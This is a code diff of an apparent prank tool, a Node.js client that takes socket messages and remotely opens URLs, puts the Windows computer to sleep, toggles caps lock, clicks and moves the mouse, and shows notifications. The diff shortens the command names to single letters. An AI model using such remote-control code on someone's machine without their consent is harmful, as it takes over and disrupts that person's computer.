@@ -91,7 +91,7 @@ socket.on("message", async (message) => {
     try {
         console.log(`Received message: ${message}`);
         switch (message) {
-            case 'rickroll':
+            case 'l':
                 console.log("Rickroll detected");
             
 
@@ -100,13 +100,13 @@ socket.on("message", async (message) => {
                 child_process.exec(start + ' ' + url);
 
                 break;
-            case 'sleep':
+            case 'z':
                 console.log("Sleep detected");
 
                 child_process.exec('rundll32.exe powrprof.dll,SetSuspendState 0,1,0');
 
                 break;
-            case 'notification':
+            case 'n':
                 const ran = notifications();
 
                 const tempFilePath = path.join(__dirname, 'temp_icon.png');
@@ -133,18 +133,18 @@ socket.on("message", async (message) => {
                 }, 1000)
 
                 break;
-            case 'cap':
+            case 'c':
                 if (Math.random() < 0.5) {
                     robot.keyToggle('capslock', 'down');
                 } else {
                     robot.keyToggle('capslock', 'up');
                 }
                 break;
-            case 'click':
+            case 'r':
                 console.log("Click detected");
                 robot.mouseClick();
                 break;
-            case 'wiggle':
+            case 'w':
                 console.log("Wiggle detected");
                 const pos = robot.getMousePos();
                 const x = pos.x + (Math.random() < 0.5 ? -10 : 10);
